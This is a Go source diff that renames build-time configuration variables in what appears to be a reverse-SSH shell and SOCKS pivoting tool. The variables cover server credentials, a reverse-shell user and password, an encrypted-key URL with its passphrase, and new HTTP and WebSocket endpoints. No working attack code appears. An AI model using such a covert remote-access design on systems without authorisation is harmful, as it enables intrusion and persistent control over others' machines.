@@ -7,25 +7,27 @@ var connections = new(sync.WaitGroup)
 
 // LD_FLAGS' modifiable constants
 var (
-	serverHost      string //server host
-	serverPort      string //server port
-	serverUser      string //server user, logging in to server SSH
+	SSHServerHost string //SSHServer host
+	SSHServerPort string //SSHServer port
+	SSHServerUser string //SSHServer user, logging in to SSHServer SSH
 
-	remoteCmdHost   string //remote host
-	remoteCmdPort   string //remote port
-	remoteCmdUser   string //user logging in on reverse SSH shell, addt'l control
-	remoteCmdPwd    string //pw for the ^^ user
+	SSHRemoteCmdHost string //SSHRemote host
+	SSHRemoteCmdPort string //SSHRemote port
+	SSHRemoteCmdUser string //user logging in on reverse SSH shell, addt'l control
+	SSHRemoteCmdPwd  string //pw for the ^^ user
 
-	localHost       string //local host
-	localPort       string //local port
+	localHost string //local host
+	localPort string //local port
 
-	remoteSocksHost string //SOCKS host
-	remoteSocksPort string //SOCKS port
+	SSHRemoteSocksHost string //SOCKS host
+	SSHRemoteSocksPort string //SOCKS port
 
+	SSHServerUserKeyUrl        string // Where encrypted RSA key for SSH tunnel lives
+	SSHServerUserKeyPassphrase string // decryption key for ^^
 
-	serverUserKeyUrl 		string // Where encrypted RSA key for SSH tunnel lives
-	serverUserKeyPassphrase string // decryption key for ^^
-
+	HTTPProxy    string // HTTP Proxy
+	HTTPEndpoint string // HTTP Endpoint
+	WSEndpoint   string // WS/S Endpoint
 )
 
 // local service to be forwarded
@@ -34,20 +36,20 @@ var localEndpoint = Endpoint{
 	Port: localPort,
 }
 
-// remote SSH server
-var serverEndpoint = Endpoint{
-	Host: serverHost, //"192.168.88.15",
-	Port: serverPort,
+// SSHRemote SSH SSHServer
+var SSHServerEndpoint = Endpoint{
+	Host: SSHServerHost, //"192.168.88.15",
+	Port: SSHServerPort,
 }
 
-// remote reverse forwarding port for shell (on remote SSH server network)
-var remoteEndpoint = Endpoint{
-	Host: remoteCmdHost,
-	Port: remoteCmdPort,
+// SSHRemote reverse forwarding port for shell (on SSHRemote SSH SSHServer network)
+var SSHRemoteEndpoint = Endpoint{
+	Host: SSHRemoteCmdHost,
+	Port: SSHRemoteCmdPort,
 }
 
-// remote reverse forwarding port for SOCKS (on remote SSH server network)
-var remoteEndpointSOCKS = Endpoint{
-	Host: remoteSocksHost,
-	Port: remoteSocksPort,
+// SSHRemote reverse forwarding port for SOCKS (on SSHRemote SSH SSHServer network)
+var SSHRemoteEndpointSOCKS = Endpoint{
+	Host: SSHRemoteSocksHost,
+	Port: SSHRemoteSocksPort,
 }
